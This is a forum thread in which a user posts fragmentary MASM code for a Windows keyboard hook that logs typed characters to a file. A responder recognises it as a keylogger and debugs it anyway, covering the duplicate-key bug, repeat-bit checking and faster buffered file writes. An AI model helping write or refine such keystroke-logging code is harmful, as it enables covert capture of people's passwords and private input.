    <div class="body">Sorry for bad code :)). Its written for about hour, but I'm encounter such a problem - on some apps keys entered are duplicated, I'm stuck on this, besides it is hard to debug in sice. Please, help, where is my problem<br /><br />KeyProc proc nCode:DWORD,wParam:DWORD,lParam:DWORD<br />invoke CallNextHookEx, hHook, nCode, wParam, lParam<br />	.IF nCode &gt;= 0<br />	mov edx, lParam<br />	ASSUME edx: ptr MSG<br />	.IF (.message == WM_CHAR)<br /><br />	mov eax, .wParam<br />	mov edi, offset strng<br />	add edi, <br />	stosb<br />	inc <br /><br />	call write ;write it immidiately in file<br />	mov edi, offset strng<br />	mov ecx, 4096<br />	call clrbuf ;clear up buffer - for future use<br />	xor eax, eax<br />	mov , eax<br />	ASSUME edx: NOTHING<br />	.ENDIF<br />lParam<br />.ENDIF<br />ret<br />KeyProc endp</div>

    <div class="body">Mmmmh, a keylogger.... against my better judgement i will assume that you have a valid reason for writing it...<br /><br />You have several problems with this code:<br /><br /><div class="quote">    mov edi, offset strng<br />	mov ecx, 4096<br />	call clrbuf ;clear up buffer - for future use</div>You clear the buffer <em>every</em> time you come through this message handler????!!! No comment needed here!<br /><br /><div class="quote">	ASSUME edx: NOTHING<br />	.ENDIF</div> To be technically correct, this 'ASSUME edx : nothing' should be <em>outside</em> the .ENDIF, that way it matches the original ASSUME.<br /><br /><div class="quote">lParam<br />.ENDIF</div>This 'lParam' looks awful lonely sitting here by itself, what is it doing?<br /><br />Your biggest mistake is that you are not checking bit30 of lParam to see if this is a repeat message; it is possible for several WM_CHAR messages to get sent for each single keypress.</div>

    <div class="body">Thank you very much, that's it.<br /><br />Now some explanation about buffer clearing. My plan was to fill this buffer till the end and then write it to file, that's why this code in here.<br />lParam - is kinda mistake here :)))<br /><br />And again thanks a lot for pointing me the right door</div>

    <div class="body"><div class="quote"><em>Originally posted by masquer </em>My plan was to fill this buffer till the end and then write it to file, that's why this code in here.</em></div><br />No problems :). <br /><br />With your buffer clearing, leave your call where it is, just test the size of strl first. I would suggest you write the whole buffer to file at once, rather than one character at a time, that will speed it up a lot.</div>

    <div class="body">Subj, sluggy, thanks again.<br />Now i have one more question:<br />mov eax, lParam<br />what's the difference here between<br />test eax, 80000000h<br />    and<br />and eax, 80000000h ;I know this is right :)<br />OK, we clear bit31, and what. I mean what this mean for my hook and target application.<br />And finally<br />xor eax, eax<br /><br />Is there another technique of processing the keystrokes entered?<br />Url's, etc is accepted.</div>
